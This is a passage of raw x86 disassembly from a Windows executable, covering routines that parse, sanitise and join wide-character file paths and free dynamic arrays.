  403287:	8b 75 10             	mov    0x10(%ebp),%esi
  40328a:	3b f0                	cmp    %eax,%esi
  40328c:	74 27                	je     0x4032b5
  40328e:	57                   	push   %edi
  40328f:	50                   	push   %eax
  403290:	56                   	push   %esi
  403291:	e8 df 6c 01 00       	call   0x419f75
  403296:	83 c4 0c             	add    $0xc,%esp
  403299:	eb 1a                	jmp    0x4032b5
  40329b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40329f:	8b 75 10             	mov    0x10(%ebp),%esi
  4032a2:	74 0c                	je     0x4032b0
  4032a4:	57                   	push   %edi
  4032a5:	56                   	push   %esi
  4032a6:	ff 75 08             	push   0x8(%ebp)
  4032a9:	e8 1f 43 00 00       	call   0x4075cd
  4032ae:	eb 05                	jmp    0x4032b5
  4032b0:	33 c0                	xor    %eax,%eax
  4032b2:	66 89 06             	mov    %ax,(%esi)
  4032b5:	85 ff                	test   %edi,%edi
  4032b7:	74 07                	je     0x4032c0
  4032b9:	33 c0                	xor    %eax,%eax
  4032bb:	66 89 44 7e fe       	mov    %ax,-0x2(%esi,%edi,2)
  4032c0:	5f                   	pop    %edi
  4032c1:	8b c6                	mov    %esi,%eax
  4032c3:	5e                   	pop    %esi
  4032c4:	5d                   	pop    %ebp
  4032c5:	c2 10 00             	ret    $0x10
  4032c8:	55                   	push   %ebp
  4032c9:	8b ec                	mov    %esp,%ebp
  4032cb:	b8 00 10 00 00       	mov    $0x1000,%eax
  4032d0:	e8 fb f8 00 00       	call   0x412bd0
  4032d5:	56                   	push   %esi
  4032d6:	8b 75 08             	mov    0x8(%ebp),%esi
  4032d9:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4032dd:	75 07                	jne    0x4032e6
  4032df:	32 c0                	xor    %al,%al
  4032e1:	e9 6a 01 00 00       	jmp    0x403450
  4032e6:	53                   	push   %ebx
  4032e7:	57                   	push   %edi
  4032e8:	56                   	push   %esi
  4032e9:	e8 69 01 00 00       	call   0x403457
  4032ee:	56                   	push   %esi
  4032ef:	e8 5f 4b 01 00       	call   0x417e53
  4032f4:	59                   	pop    %ecx
  4032f5:	56                   	push   %esi
  4032f6:	8b f8                	mov    %eax,%edi
  4032f8:	e8 86 01 00 00       	call   0x403483
  4032fd:	84 c0                	test   %al,%al
  4032ff:	74 77                	je     0x403378
  403301:	56                   	push   %esi
  403302:	e8 50 01 00 00       	call   0x403457
  403307:	84 c0                	test   %al,%al
  403309:	74 24                	je     0x40332f
  40330b:	8d 47 04             	lea    0x4(%edi),%eax
  40330e:	39 45 10             	cmp    %eax,0x10(%ebp)
  403311:	0f 86 35 01 00 00    	jbe    0x40344c
  403317:	ff 75 10             	push   0x10(%ebp)
  40331a:	68 08 73 42 00       	push   $0x427308
  40331f:	ff 75 0c             	push   0xc(%ebp)
  403322:	e8 b4 32 00 00       	call   0x4065db
  403327:	ff 75 10             	push   0x10(%ebp)
  40332a:	e9 10 01 00 00       	jmp    0x40343f
  40332f:	6a 5c                	push   $0x5c
  403331:	58                   	pop    %eax
  403332:	66 39 06             	cmp    %ax,(%esi)
  403335:	0f 85 11 01 00 00    	jne    0x40344c
  40333b:	8d 5e 02             	lea    0x2(%esi),%ebx
  40333e:	66 39 03             	cmp    %ax,(%ebx)
  403341:	0f 85 05 01 00 00    	jne    0x40344c
  403347:	8b 75 10             	mov    0x10(%ebp),%esi
  40334a:	8d 47 06             	lea    0x6(%edi),%eax
  40334d:	3b f0                	cmp    %eax,%esi
  40334f:	0f 86 f7 00 00 00    	jbe    0x40344c
  403355:	56                   	push   %esi
  403356:	68 08 73 42 00       	push   $0x427308
  40335b:	ff 75 0c             	push   0xc(%ebp)
  40335e:	e8 78 32 00 00       	call   0x4065db
  403363:	56                   	push   %esi
  403364:	68 14 73 42 00       	push   $0x427314
  403369:	ff 75 0c             	push   0xc(%ebp)
  40336c:	e8 42 32 00 00       	call   0x4065b3
  403371:	56                   	push   %esi
  403372:	53                   	push   %ebx
  403373:	e9 c8 00 00 00       	jmp    0x403440
  403378:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40337e:	bb ff 07 00 00       	mov    $0x7ff,%ebx
  403383:	50                   	push   %eax
  403384:	53                   	push   %ebx
  403385:	ff 15 58 70 42 00    	call   *0x427058
  40338b:	85 c0                	test   %eax,%eax
  40338d:	0f 84 b9 00 00 00    	je     0x40344c
  403393:	3b c3                	cmp    %ebx,%eax
  403395:	0f 87 b1 00 00 00    	ja     0x40344c
  40339b:	0f b7 06             	movzwl (%esi),%eax
  40339e:	50                   	push   %eax
  40339f:	e8 15 01 00 00       	call   0x4034b9
  4033a4:	84 c0                	test   %al,%al
  4033a6:	74 37                	je     0x4033df
  4033a8:	8d 47 06             	lea    0x6(%edi),%eax
  4033ab:	8b 7d 10             	mov    0x10(%ebp),%edi
  4033ae:	3b f8                	cmp    %eax,%edi
  4033b0:	0f 86 96 00 00 00    	jbe    0x40344c
  4033b6:	57                   	push   %edi
  4033b7:	68 08 73 42 00       	push   $0x427308
  4033bc:	ff 75 0c             	push   0xc(%ebp)
  4033bf:	e8 17 32 00 00       	call   0x4065db
  4033c4:	33 c0                	xor    %eax,%eax
  4033c6:	66 89 85 04 f0 ff ff 	mov    %ax,-0xffc(%ebp)
  4033cd:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4033d3:	57                   	push   %edi
  4033d4:	50                   	push   %eax
  4033d5:	ff 75 0c             	push   0xc(%ebp)
  4033d8:	e8 d6 31 00 00       	call   0x4065b3
  4033dd:	eb 5f                	jmp    0x40343e
  4033df:	68 00 08 00 00       	push   $0x800
  4033e4:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4033ea:	50                   	push   %eax
  4033eb:	e8 e3 fa ff ff       	call   0x402ed3
  4033f0:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4033f6:	50                   	push   %eax
  4033f7:	e8 57 4a 01 00       	call   0x417e53
  4033fc:	83 c7 04             	add    $0x4,%edi
  4033ff:	03 c7                	add    %edi,%eax
  403401:	8b 7d 10             	mov    0x10(%ebp),%edi
  403404:	59                   	pop    %ecx
  403405:	3b f8                	cmp    %eax,%edi
  403407:	76 43                	jbe    0x40344c
  403409:	57                   	push   %edi
  40340a:	68 08 73 42 00       	push   $0x427308
  40340f:	ff 75 0c             	push   0xc(%ebp)
  403412:	e8 c4 31 00 00       	call   0x4065db
  403417:	57                   	push   %edi
  403418:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40341e:	50                   	push   %eax
  40341f:	ff 75 0c             	push   0xc(%ebp)
  403422:	e8 8c 31 00 00       	call   0x4065b3
  403427:	66 83 3e 2e          	cmpw   $0x2e,(%esi)
  40342b:	75 11                	jne    0x40343e
  40342d:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  403431:	50                   	push   %eax
  403432:	e8 82 00 00 00       	call   0x4034b9
  403437:	84 c0                	test   %al,%al
  403439:	74 03                	je     0x40343e
  40343b:	83 c6 04             	add    $0x4,%esi
  40343e:	57                   	push   %edi
  40343f:	56                   	push   %esi
  403440:	ff 75 0c             	push   0xc(%ebp)
  403443:	e8 6b 31 00 00       	call   0x4065b3
  403448:	b0 01                	mov    $0x1,%al
  40344a:	eb 02                	jmp    0x40344e
  40344c:	32 c0                	xor    %al,%al
  40344e:	5f                   	pop    %edi
  40344f:	5b                   	pop    %ebx
  403450:	5e                   	pop    %esi
  403451:	8b e5                	mov    %ebp,%esp
  403453:	5d                   	pop    %ebp
  403454:	c2 0c 00             	ret    $0xc
  403457:	56                   	push   %esi
  403458:	8b 74 24 08          	mov    0x8(%esp),%esi
  40345c:	0f b7 06             	movzwl (%esi),%eax
  40345f:	50                   	push   %eax
  403460:	e8 29 30 00 00       	call   0x40648e
  403465:	0f b7 c0             	movzwl %ax,%eax
  403468:	83 c0 bf             	add    $0xffffffbf,%eax
  40346b:	66 83 f8 19          	cmp    $0x19,%ax
  40346f:	77 0c                	ja     0x40347d
  403471:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  403476:	75 05                	jne    0x40347d
  403478:	33 c0                	xor    %eax,%eax
  40347a:	40                   	inc    %eax
  40347b:	eb 02                	jmp    0x40347f
  40347d:	33 c0                	xor    %eax,%eax
  40347f:	5e                   	pop    %esi
  403480:	c2 04 00             	ret    $0x4
  403483:	56                   	push   %esi
  403484:	8b 74 24 08          	mov    0x8(%esp),%esi
  403488:	6a 5c                	push   $0x5c
  40348a:	58                   	pop    %eax
  40348b:	66 39 06             	cmp    %ax,(%esi)
  40348e:	75 06                	jne    0x403496
  403490:	66 39 46 02          	cmp    %ax,0x2(%esi)
  403494:	74 18                	je     0x4034ae
  403496:	56                   	push   %esi
  403497:	e8 bb ff ff ff       	call   0x403457
  40349c:	84 c0                	test   %al,%al
  40349e:	74 13                	je     0x4034b3
  4034a0:	0f b7 46 04          	movzwl 0x4(%esi),%eax
  4034a4:	50                   	push   %eax
  4034a5:	e8 0f 00 00 00       	call   0x4034b9
  4034aa:	84 c0                	test   %al,%al
  4034ac:	74 05                	je     0x4034b3
  4034ae:	33 c0                	xor    %eax,%eax
  4034b0:	40                   	inc    %eax
  4034b1:	eb 02                	jmp    0x4034b5
  4034b3:	33 c0                	xor    %eax,%eax
  4034b5:	5e                   	pop    %esi
  4034b6:	c2 04 00             	ret    $0x4
  4034b9:	83 7c 24 04 5c       	cmpl   $0x5c,0x4(%esp)
  4034be:	74 0b                	je     0x4034cb
  4034c0:	83 7c 24 04 2f       	cmpl   $0x2f,0x4(%esp)
  4034c5:	74 04                	je     0x4034cb
  4034c7:	33 c0                	xor    %eax,%eax
  4034c9:	eb 03                	jmp    0x4034ce
  4034cb:	33 c0                	xor    %eax,%eax
  4034cd:	40                   	inc    %eax
  4034ce:	c2 04 00             	ret    $0x4
  4034d1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4034d5:	85 c0                	test   %eax,%eax
  4034d7:	75 04                	jne    0x4034dd
  4034d9:	32 c0                	xor    %al,%al
  4034db:	eb 31                	jmp    0x40350e
  4034dd:	6a 5c                	push   $0x5c
  4034df:	59                   	pop    %ecx
  4034e0:	66 39 08             	cmp    %cx,(%eax)
  4034e3:	75 16                	jne    0x4034fb
  4034e5:	66 39 48 02          	cmp    %cx,0x2(%eax)
  4034e9:	75 10                	jne    0x4034fb
  4034eb:	66 83 78 04 3f       	cmpw   $0x3f,0x4(%eax)
  4034f0:	75 09                	jne    0x4034fb
  4034f2:	66 39 48 06          	cmp    %cx,0x6(%eax)
  4034f6:	75 03                	jne    0x4034fb
  4034f8:	83 c0 08             	add    $0x8,%eax
  4034fb:	68 d0 72 42 00       	push   $0x4272d0
  403500:	50                   	push   %eax
  403501:	e8 ec 6a 01 00       	call   0x419ff2
  403506:	f7 d8                	neg    %eax
  403508:	59                   	pop    %ecx
  403509:	1b c0                	sbb    %eax,%eax
  40350b:	59                   	pop    %ecx
  40350c:	f7 d8                	neg    %eax
  40350e:	c2 04 00             	ret    $0x4
  403511:	55                   	push   %ebp
  403512:	8b ec                	mov    %esp,%ebp
  403514:	b8 00 10 00 00       	mov    $0x1000,%eax
  403519:	e8 b2 f6 00 00       	call   0x412bd0
  40351e:	56                   	push   %esi
  40351f:	be 00 08 00 00       	mov    $0x800,%esi
  403524:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40352a:	56                   	push   %esi
  40352b:	ff 75 08             	push   0x8(%ebp)
  40352e:	50                   	push   %eax
  40352f:	e8 a7 30 00 00       	call   0x4065db
  403534:	56                   	push   %esi
  403535:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40353b:	50                   	push   %eax
  40353c:	e8 92 f9 ff ff       	call   0x402ed3
  403541:	56                   	push   %esi
  403542:	ff 75 0c             	push   0xc(%ebp)
  403545:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40354b:	50                   	push   %eax
  40354c:	e8 62 30 00 00       	call   0x4065b3
  403551:	ff 75 14             	push   0x14(%ebp)
  403554:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40355a:	50                   	push   %eax
  40355b:	ff 75 10             	push   0x10(%ebp)
  40355e:	e8 78 30 00 00       	call   0x4065db
  403563:	5e                   	pop    %esi
  403564:	8b e5                	mov    %ebp,%esp
  403566:	5d                   	pop    %ebp
  403567:	c2 10 00             	ret    $0x10
  40356a:	55                   	push   %ebp
  40356b:	56                   	push   %esi
  40356c:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403570:	33 ed                	xor    %ebp,%ebp
  403572:	66 39 2e             	cmp    %bp,(%esi)
  403575:	74 5b                	je     0x4035d2
  403577:	53                   	push   %ebx
  403578:	8a 5c 24 14          	mov    0x14(%esp),%bl
  40357c:	57                   	push   %edi
  40357d:	8b fd                	mov    %ebp,%edi
  40357f:	b9 e4 72 42 00       	mov    $0x4272e4,%ecx
  403584:	84 db                	test   %bl,%bl
  403586:	75 05                	jne    0x40358d
  403588:	b9 f4 72 42 00       	mov    $0x4272f4,%ecx
  40358d:	0f b7 06             	movzwl (%esi),%eax
  403590:	50                   	push   %eax
  403591:	51                   	push   %ecx
  403592:	e8 37 0c 01 00       	call   0x4141ce
  403597:	59                   	pop    %ecx
  403598:	59                   	pop    %ecx
  403599:	85 c0                	test   %eax,%eax
  40359b:	75 0a                	jne    0x4035a7
  40359d:	84 db                	test   %bl,%bl
  40359f:	74 0e                	je     0x4035af
  4035a1:	66 83 3e 20          	cmpw   $0x20,(%esi)
  4035a5:	73 08                	jae    0x4035af
  4035a7:	6a 5f                	push   $0x5f
  4035a9:	59                   	pop    %ecx
  4035aa:	66 89 0e             	mov    %cx,(%esi)
  4035ad:	eb 03                	jmp    0x4035b2
  4035af:	6a 5f                	push   $0x5f
  4035b1:	59                   	pop    %ecx
  4035b2:	8b c7                	mov    %edi,%eax
  4035b4:	83 e0 fe             	and    $0xfffffffe,%eax
  4035b7:	83 f8 02             	cmp    $0x2,%eax
  4035ba:	7e 09                	jle    0x4035c5
  4035bc:	66 83 3e 3a          	cmpw   $0x3a,(%esi)
  4035c0:	75 03                	jne    0x4035c5
  4035c2:	66 89 0e             	mov    %cx,(%esi)
  4035c5:	83 c6 02             	add    $0x2,%esi
  4035c8:	83 c7 02             	add    $0x2,%edi
  4035cb:	66 39 2e             	cmp    %bp,(%esi)
  4035ce:	75 af                	jne    0x40357f
  4035d0:	5f                   	pop    %edi
  4035d1:	5b                   	pop    %ebx
  4035d2:	5e                   	pop    %esi
  4035d3:	5d                   	pop    %ebp
  4035d4:	c2 08 00             	ret    $0x8
  4035d7:	56                   	push   %esi
  4035d8:	8b 74 24 08          	mov    0x8(%esp),%esi
  4035dc:	56                   	push   %esi
  4035dd:	e8 71 48 01 00       	call   0x417e53
  4035e2:	59                   	pop    %ecx
  4035e3:	85 c0                	test   %eax,%eax
  4035e5:	74 06                	je     0x4035ed
  4035e7:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4035ea:	83 c6 fe             	add    $0xfffffffe,%esi
  4035ed:	8b c6                	mov    %esi,%eax
  4035ef:	5e                   	pop    %esi
  4035f0:	c2 04 00             	ret    $0x4
  4035f3:	53                   	push   %ebx
  4035f4:	56                   	push   %esi
  4035f5:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4035f9:	57                   	push   %edi
  4035fa:	56                   	push   %esi
  4035fb:	e8 53 48 01 00       	call   0x417e53
  403600:	8b f8                	mov    %eax,%edi
  403602:	83 ef 01             	sub    $0x1,%edi
  403605:	59                   	pop    %ecx
  403606:	78 18                	js     0x403620
  403608:	8d 1c 7e             	lea    (%esi,%edi,2),%ebx
  40360b:	0f b7 03             	movzwl (%ebx),%eax
  40360e:	50                   	push   %eax
  40360f:	e8 a5 fe ff ff       	call   0x4034b9
  403614:	84 c0                	test   %al,%al
  403616:	75 20                	jne    0x403638
  403618:	83 eb 02             	sub    $0x2,%ebx
  40361b:	83 ef 01             	sub    $0x1,%edi
  40361e:	79 eb                	jns    0x40360b
  403620:	66 83 3e 00          	cmpw   $0x0,(%esi)
  403624:	74 0a                	je     0x403630
  403626:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  40362b:	75 03                	jne    0x403630
  40362d:	83 c6 04             	add    $0x4,%esi
  403630:	8b c6                	mov    %esi,%eax
  403632:	5f                   	pop    %edi
  403633:	5e                   	pop    %esi
  403634:	5b                   	pop    %ebx
  403635:	c2 04 00             	ret    $0x4
  403638:	8d 43 02             	lea    0x2(%ebx),%eax
  40363b:	eb f5                	jmp    0x403632
  40363d:	56                   	push   %esi
  40363e:	8b 74 24 08          	mov    0x8(%esp),%esi
  403642:	56                   	push   %esi
  403643:	e8 ab ff ff ff       	call   0x4035f3
  403648:	8d 4e 04             	lea    0x4(%esi),%ecx
  40364b:	3b c1                	cmp    %ecx,%eax
  40364d:	72 11                	jb     0x403660
  40364f:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  403654:	75 07                	jne    0x40365d
  403656:	8d 4e 08             	lea    0x8(%esi),%ecx
  403659:	3b c1                	cmp    %ecx,%eax
  40365b:	72 03                	jb     0x403660
  40365d:	83 e8 02             	sub    $0x2,%eax
  403660:	33 c9                	xor    %ecx,%ecx
  403662:	66 89 08             	mov    %cx,(%eax)
  403665:	5e                   	pop    %esi
  403666:	c2 04 00             	ret    $0x4
  403669:	55                   	push   %ebp
  40366a:	8b ec                	mov    %esp,%ebp
  40366c:	56                   	push   %esi
  40366d:	8b 75 08             	mov    0x8(%ebp),%esi
  403670:	85 f6                	test   %esi,%esi
  403672:	74 35                	je     0x4036a9
  403674:	66 83 3e 00          	cmpw   $0x0,(%esi)
  403678:	74 2f                	je     0x4036a9
  40367a:	56                   	push   %esi
  40367b:	e8 01 fb ff ff       	call   0x403181
  403680:	85 c0                	test   %eax,%eax
  403682:	74 05                	je     0x403689
  403684:	33 c9                	xor    %ecx,%ecx
  403686:	66 89 08             	mov    %cx,(%eax)
  403689:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40368d:	74 1a                	je     0x4036a9
  40368f:	ff 75 10             	push   0x10(%ebp)
  403692:	68 c4 72 42 00       	push   $0x4272c4
  403697:	56                   	push   %esi
  403698:	e8 16 2f 00 00       	call   0x4065b3
  40369d:	ff 75 10             	push   0x10(%ebp)
  4036a0:	ff 75 0c             	push   0xc(%ebp)
  4036a3:	56                   	push   %esi
  4036a4:	e8 0a 2f 00 00       	call   0x4065b3
  4036a9:	5e                   	pop    %esi
  4036aa:	5d                   	pop    %ebp
  4036ab:	c2 0c 00             	ret    $0xc
  4036ae:	ff 74 24 04          	push   0x4(%esp)
  4036b2:	e8 3c ff ff ff       	call   0x4035f3
  4036b7:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4036bb:	8b d0                	mov    %eax,%edx
  4036bd:	2b 54 24 04          	sub    0x4(%esp),%edx
  4036c1:	d1 fa                	sar    $1,%edx
  4036c3:	2b ca                	sub    %edx,%ecx
  4036c5:	51                   	push   %ecx
  4036c6:	ff 74 24 0c          	push   0xc(%esp)
  4036ca:	50                   	push   %eax
  4036cb:	e8 0b 2f 00 00       	call   0x4065db
  4036d0:	c2 0c 00             	ret    $0xc
  4036d3:	53                   	push   %ebx
  4036d4:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4036d8:	33 c9                	xor    %ecx,%ecx
  4036da:	57                   	push   %edi
  4036db:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4036df:	83 eb 01             	sub    $0x1,%ebx
  4036e2:	74 26                	je     0x40370a
  4036e4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4036e8:	56                   	push   %esi
  4036e9:	8b f7                	mov    %edi,%esi
  4036eb:	2b f0                	sub    %eax,%esi
  4036ed:	0f b7 10             	movzwl (%eax),%edx
  4036f0:	66 85 d2             	test   %dx,%dx
  4036f3:	74 14                	je     0x403709
  4036f5:	83 fa 2f             	cmp    $0x2f,%edx
  4036f8:	75 03                	jne    0x4036fd
  4036fa:	6a 5c                	push   $0x5c
  4036fc:	5a                   	pop    %edx
  4036fd:	66 89 14 06          	mov    %dx,(%esi,%eax,1)
  403701:	41                   	inc    %ecx
  403702:	83 c0 02             	add    $0x2,%eax
  403705:	3b cb                	cmp    %ebx,%ecx
  403707:	72 e4                	jb     0x4036ed
  403709:	5e                   	pop    %esi
  40370a:	33 c0                	xor    %eax,%eax
  40370c:	66 89 04 4f          	mov    %ax,(%edi,%ecx,2)
  403710:	5f                   	pop    %edi
  403711:	5b                   	pop    %ebx
  403712:	c2 0c 00             	ret    $0xc
  403715:	8d 44 24 10          	lea    0x10(%esp),%eax
  403719:	50                   	push   %eax
  40371a:	6a 00                	push   $0x0
  40371c:	ff 74 24 14          	push   0x14(%esp)
  403720:	ff 74 24 14          	push   0x14(%esp)
  403724:	ff 74 24 14          	push   0x14(%esp)
  403728:	e8 09 e3 ff ff       	call   0x401a36
  40372d:	83 c4 14             	add    $0x14,%esp
  403730:	c3                   	ret
  403731:	51                   	push   %ecx
  403732:	33 c0                	xor    %eax,%eax
  403734:	89 0c 24             	mov    %ecx,(%esp)
  403737:	89 01                	mov    %eax,(%ecx)
  403739:	89 41 04             	mov    %eax,0x4(%ecx)
  40373c:	89 41 08             	mov    %eax,0x8(%ecx)
  40373f:	89 41 0c             	mov    %eax,0xc(%ecx)
  403742:	88 41 10             	mov    %al,0x10(%ecx)
  403745:	89 41 14             	mov    %eax,0x14(%ecx)
  403748:	89 41 18             	mov    %eax,0x18(%ecx)
  40374b:	89 41 1c             	mov    %eax,0x1c(%ecx)
  40374e:	89 41 20             	mov    %eax,0x20(%ecx)
  403751:	88 41 24             	mov    %al,0x24(%ecx)
  403754:	89 41 28             	mov    %eax,0x28(%ecx)
  403757:	89 41 2c             	mov    %eax,0x2c(%ecx)
  40375a:	89 41 30             	mov    %eax,0x30(%ecx)
  40375d:	89 41 34             	mov    %eax,0x34(%ecx)
  403760:	88 41 38             	mov    %al,0x38(%ecx)
  403763:	89 41 3c             	mov    %eax,0x3c(%ecx)
  403766:	89 41 40             	mov    %eax,0x40(%ecx)
  403769:	89 41 44             	mov    %eax,0x44(%ecx)
  40376c:	89 41 48             	mov    %eax,0x48(%ecx)
  40376f:	88 41 4c             	mov    %al,0x4c(%ecx)
  403772:	89 41 50             	mov    %eax,0x50(%ecx)
  403775:	89 41 54             	mov    %eax,0x54(%ecx)
  403778:	89 41 58             	mov    %eax,0x58(%ecx)
  40377b:	89 41 5c             	mov    %eax,0x5c(%ecx)
  40377e:	88 41 60             	mov    %al,0x60(%ecx)
  403781:	88 41 64             	mov    %al,0x64(%ecx)
  403784:	8b c1                	mov    %ecx,%eax
  403786:	59                   	pop    %ecx
  403787:	c3                   	ret
  403788:	55                   	push   %ebp
  403789:	8b ec                	mov    %esp,%ebp
  40378b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403791:	6a ff                	push   $0xffffffff
  403793:	68 96 64 42 00       	push   $0x426496
  403798:	50                   	push   %eax
  403799:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4037a0:	56                   	push   %esi
  4037a1:	8b f1                	mov    %ecx,%esi
  4037a3:	83 3e 00             	cmpl   $0x0,(%esi)
  4037a6:	74 1c                	je     0x4037c4
  4037a8:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  4037ac:	74 0e                	je     0x4037bc
  4037ae:	8b 46 08             	mov    0x8(%esi),%eax
  4037b1:	c1 e0 02             	shl    $0x2,%eax
  4037b4:	50                   	push   %eax
  4037b5:	ff 36                	push   (%esi)
  4037b7:	e8 91 1f 00 00       	call   0x40574d
  4037bc:	ff 36                	push   (%esi)
  4037be:	e8 ab 46 01 00       	call   0x417e6e
  4037c3:	59                   	pop    %ecx
  4037c4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4037c7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4037ce:	5e                   	pop    %esi
  4037cf:	8b e5                	mov    %ebp,%esp
  4037d1:	5d                   	pop    %ebp
  4037d2:	c3                   	ret
  4037d3:	55                   	push   %ebp
  4037d4:	8b ec                	mov    %esp,%ebp
  4037d6:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4037dc:	6a ff                	push   $0xffffffff
  4037de:	68 96 64 42 00       	push   $0x426496
  4037e3:	50                   	push   %eax
  4037e4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4037eb:	56                   	push   %esi
  4037ec:	8b f1                	mov    %ecx,%esi
  4037ee:	83 3e 00             	cmpl   $0x0,(%esi)
  4037f1:	74 1a                	je     0x40380d
  4037f3:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  4037f7:	74 0c                	je     0x403805
  4037f9:	6b 46 08 0c          	imul   $0xc,0x8(%esi),%eax
  4037fd:	50                   	push   %eax
  4037fe:	ff 36                	push   (%esi)
  403800:	e8 48 1f 00 00       	call   0x40574d
  403805:	ff 36                	push   (%esi)
  403807:	e8 62 46 01 00       	call   0x417e6e
  40380c:	59                   	pop    %ecx
  40380d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403810:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403817:	5e                   	pop    %esi
  403818:	8b e5                	mov    %ebp,%esp
  40381a:	5d                   	pop    %ebp
  40381b:	c3                   	ret
  40381c:	56                   	push   %esi
  40381d:	8b f1                	mov    %ecx,%esi
  40381f:	57                   	push   %edi
  403820:	33 ff                	xor    %edi,%edi
  403822:	39 7e 2c             	cmp    %edi,0x2c(%esi)
  403825:	76 27                	jbe    0x40384e
  403827:	53                   	push   %ebx
  403828:	8b df                	mov    %edi,%ebx
  40382a:	8b 46 28             	mov    0x28(%esi),%eax
  40382d:	ff 74 03 04          	push   0x4(%ebx,%eax,1)
  403831:	e8 38 46 01 00       	call   0x417e6e
  403836:	8b 46 28             	mov    0x28(%esi),%eax
  403839:	ff 74 03 08          	push   0x8(%ebx,%eax,1)
  40383d:	e8 2c 46 01 00       	call   0x417e6e
  403842:	47                   	inc    %edi
  403843:	8d 5b 0c             	lea    0xc(%ebx),%ebx
  403846:	59                   	pop    %ecx
  403847:	59                   	pop    %ecx
  403848:	3b 7e 2c             	cmp    0x2c(%esi),%edi
  40384b:	72 dd                	jb     0x40382a
  40384d:	5b                   	pop    %ebx
  40384e:	8d 4e 50             	lea    0x50(%esi),%ecx
  403851:	e8 32 ff ff ff       	call   0x403788
  403856:	8d 4e 3c             	lea    0x3c(%esi),%ecx
  403859:	e8 2a ff ff ff       	call   0x403788
  40385e:	8d 4e 28             	lea    0x28(%esi),%ecx
  403861:	e8 6d ff ff ff       	call   0x4037d3
  403866:	8d 4e 14             	lea    0x14(%esi),%ecx
  403869:	e8 1a ff ff ff       	call   0x403788
  40386e:	5f                   	pop    %edi
  40386f:	8b ce                	mov    %esi,%ecx
  403871:	5e                   	pop    %esi
  403872:	e9 11 ff ff ff       	jmp    0x403788
  403877:	8b 44 24 04          	mov    0x4(%esp),%eax
  40387b:	56                   	push   %esi
  40387c:	8b f1                	mov    %ecx,%esi
  40387e:	01 46 04             	add    %eax,0x4(%esi)
  403881:	8b 4e 04             	mov    0x4(%esi),%ecx
  403884:	3b 4e 08             	cmp    0x8(%esi),%ecx
  403887:	0f 86 aa 00 00 00    	jbe    0x403937
  40388d:	8b 46 0c             	mov    0xc(%esi),%eax
  403890:	53                   	push   %ebx
  403891:	55                   	push   %ebp
  403892:	bd d4 0c 45 00       	mov    $0x450cd4,%ebp
  403897:	57                   	push   %edi
  403898:	85 c0                	test   %eax,%eax
  40389a:	74 1a                	je     0x4038b6
  40389c:	3b c8                	cmp    %eax,%ecx
  40389e:	76 16                	jbe    0x4038b6
  4038a0:	50                   	push   %eax
  4038a1:	68 20 73 42 00       	push   $0x427320
  4038a6:	55                   	push   %ebp
  4038a7:	e8 6d df ff ff       	call   0x401819
  4038ac:	83 c4 0c             	add    $0xc,%esp
  4038af:	8b cd                	mov    %ebp,%ecx
  4038b1:	e8 cf df ff ff       	call   0x401885
  4038b6:	8b 46 08             	mov    0x8(%esi),%eax
  4038b9:	8b 5e 04             	mov    0x4(%esi),%ebx
  4038bc:	c1 e8 02             	shr    $0x2,%eax
  4038bf:	83 c0 20             	add    $0x20,%eax
  4038c2:	03 46 08             	add    0x8(%esi),%eax
  4038c5:	3b d8                	cmp    %eax,%ebx
  4038c7:	77 02                	ja     0x4038cb
  4038c9:	8b d8                	mov    %eax,%ebx
  4038cb:	8b c3                	mov    %ebx,%eax
  4038cd:	c1 e0 02             	shl    $0x2,%eax
  4038d0:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  4038d4:	50                   	push   %eax
  4038d5:	74 42                	je     0x403919
  4038d7:	e8 ef 67 01 00       	call   0x41a0cb
  4038dc:	8b f8                	mov    %eax,%edi
  4038de:	59                   	pop    %ecx
  4038df:	85 ff                	test   %edi,%edi
  4038e1:	75 07                	jne    0x4038ea
  4038e3:	8b cd                	mov    %ebp,%ecx
  4038e5:	e8 9b df ff ff       	call   0x401885
  4038ea:	83 3e 00             	cmpl   $0x0,(%esi)
  4038ed:	74 40                	je     0x40392f
  4038ef:	8b 46 08             	mov    0x8(%esi),%eax
  4038f2:	c1 e0 02             	shl    $0x2,%eax
  4038f5:	50                   	push   %eax
  4038f6:	ff 36                	push   (%esi)
  4038f8:	57                   	push   %edi
  4038f9:	e8 52 0b 01 00       	call   0x414450
  4038fe:	8b 46 08             	mov    0x8(%esi),%eax
  403901:	83 c4 0c             	add    $0xc,%esp
  403904:	c1 e0 02             	shl    $0x2,%eax
  403907:	50                   	push   %eax
  403908:	ff 36                	push   (%esi)
